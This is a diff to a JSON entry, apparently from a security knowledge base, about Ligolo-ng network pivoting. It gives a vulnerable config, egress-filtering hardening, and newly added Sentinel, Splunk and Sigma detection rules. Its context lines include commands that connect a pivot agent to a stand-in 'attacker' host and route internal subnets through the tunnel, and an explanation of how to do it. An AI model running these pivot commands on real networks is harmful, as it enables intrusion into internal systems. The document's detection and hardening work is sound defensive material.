@@ -135,7 +135,69 @@
     ],
     "misconfiguration": "Flat network with no east-west segmentation and unrestricted outbound TLS lets a DMZ/pivot host route the attacker straight into internal subnets.",
     "vulnerable_config": "# Pivot can reach internal subnets AND has unrestricted outbound 443:\niptables -L OUTPUT   # policy ACCEPT\n# -> ./agent -connect attacker:443 -ignore-cert ; attacker: ip route add 10.10.20.0/24 dev ligolo\n# attacker now has native routed access to 10.10.20.0/24",
-    "secure_config": "# Egress filtering: block outbound 443 except to known destinations via an inspecting proxy\niptables -P OUTPUT DROP\niptables -A OUTPUT -p tcp --dport 443 -d <corp_proxy> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n# Segment DMZ from internal tiers; alert on long-lived outbound TLS from servers;\n# application allowlisting to block unsigned/unknown agent binaries."
+    "secure_config": "# Egress filtering: block outbound 443 except to known destinations via an inspecting proxy\niptables -P OUTPUT DROP\niptables -A OUTPUT -p tcp --dport 443 -d <corp_proxy> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n# Segment DMZ from internal tiers; alert on long-lived outbound TLS from servers;\n# application allowlisting to block unsigned/unknown agent binaries.",
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "Ligolo-ng - TUN-Interface Pivot (no proxychains) - Sentinel",
+        "logic": "DeviceNetworkEvents\n| where RemotePort == 11601 or (InitiatingProcessCommandLine has \"-connect\" and InitiatingProcessCommandLine has \"ignore-cert\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, RemoteIP, RemotePort\n| sort by Timestamp desc\n// pivot holding a long-lived outbound TLS to the attacker; new east-west flows sourced from it",
+        "data_source": "defender-endpoint",
+        "attack": [
+          "T1090.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      },
+      {
+        "platform": "splunk",
+        "name": "Ligolo-ng - TUN-Interface Pivot (no proxychains) (1) - Splunk",
+        "logic": "index=sysmon EventCode=1 (Image=\"*agent*\" CommandLine=\"*-connect*11601*\") OR CommandLine=\"*ligolo*\"\n| table _time, Computer, User, CommandLine",
+        "data_source": "sysmon",
+        "attack": [
+          "T1090.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "1"
+        ]
+      },
+      {
+        "platform": "splunk",
+        "name": "Ligolo-ng - TUN-Interface Pivot (no proxychains) (2) - Splunk",
+        "logic": "index=sysmon EventCode=3 DestinationPort=11601\n| table _time, Computer, Image, DestinationIp",
+        "data_source": "sysmon",
+        "attack": [
+          "T1090.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium",
+        "log_ids": [
+          "3"
+        ]
+      },
+      {
+        "platform": "sigma",
+        "name": "net_ligolo_ng_agent_tunnel",
+        "logic": "net_ligolo_ng_agent_tunnel",
+        "data_source": "windows-security",
+        "attack": [
+          "T1090.001"
+        ],
+        "fidelity": "behavioral",
+        "confidence": "medium"
+      }
+    ],
+    "visibility": {
+      "requires": [
+        "defender-endpoint",
+        "sysmon",
+        "windows-security"
+      ],
+      "better_with": [
+        "edr"
+      ]
+    }
   },
   "explain": "Connects the Ligolo-ng agent on a compromised pivot back to your proxy, creating a virtual TUN interface locally:\n  ./agent          the implant run on the pivot\n  -connect <attacker_ip>:11601   dial back to the proxy you started with -selfcert\n  -ignore-cert     accept the proxy's self-signed TLS cert\nAfter 'session' + a route to the subnet via the ligolo interface + 'start', you reach the internal network with normal tools - no proxychains."
 }
